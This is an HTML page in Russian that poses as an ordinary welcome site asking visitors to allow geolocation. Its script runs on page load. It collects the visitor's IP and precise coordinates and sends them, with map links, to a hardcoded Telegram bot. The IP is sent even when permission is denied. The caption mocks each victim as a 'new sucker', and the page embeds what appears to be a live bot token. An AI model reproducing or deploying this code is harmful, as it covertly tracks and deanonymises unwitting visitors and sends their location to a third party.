<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Даю Добро</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Приветствуем на нашем сайте!</h1>
    <p>Пожалуйста, разрешите доступ к геолокации для продолжения работы.</p>
</div>

<script>
    // НАСТРОЙКИ (Вставь свои данные сюда)
    const TELEGRAM_BOT_TOKEN = '8894434630:AAFel26CV1rYtt1EtwLJVUuCMGf1U_QwCwY'; 
    const TELEGRAM_CHAT_ID = '8296850527';

    // Отправка текста в Telegram (если нужно)
    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        return fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    }

    // Отправка фото (URL) в Telegram
    function sendPhotoToTelegram(photoUrl, caption) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

        return fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                photo: photoUrl,
                caption: caption,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) {
                console.error('Ошибка отправки фото в Telegram');
            }
        })
        .catch(error => console.error('Ошибка сети:', error));
    }

    // Получение IP
    async function getClientIp() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch (e) {
            console.error('Ошибка получения IP:', e);
            return 'не удалось получить IP';
        }
    }

    // Запрос геолокации при загрузке страницы
    window.addEventListener('load', async () => {
        const userIp = await getClientIp();

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    // Статическая карта на базе OpenStreetMap (без ключа)
                    const staticMapUrl = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=15&size=600x400&markers=${lat},${lon},ol-marker`;

                    const caption = `*новый лошок
` +
                                    `• IP: `${userIp}`
` +
                                    `• Широта: `${lat}`
` +
                                    `• Долгота: `${lon}`
` +
                                    `• Точность: ~${Math.round(accuracy)} м.

` +
                                    `🔗 [Открыть на картах](${mapUrl})`;

                    // Отправляем фото (карту) + подпись
                    await sendPhotoToTelegram(staticMapUrl, caption);
                },
                async (error) => {
                    let errorMsg = '';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg = 'Пользователь запретил доступ к геопозиции.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg = 'Информация о местоположении недоступна.';
                            break;
                        case error.TIMEOUT:
                            errorMsg = 'Истекло время ожидания запроса геопозиции.';
                            break;
                        default:
                            errorMsg = 'Неизвестная ошибка при запросе геопозиции.';
                    }

                    const text = `⚠️ *Посетитель перешел на сайт, но:* 
${errorMsg}

` +
                                 `• IP: `${userIp}``;

                    await sendToTelegram(text);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            const text = '❌ Браузер пользователя не поддерживает Geolocation API.
' +
                         `• IP: `${userIp}``;
            await sendToTelegram(text);
        }
    });
</script>

</body>
</html>
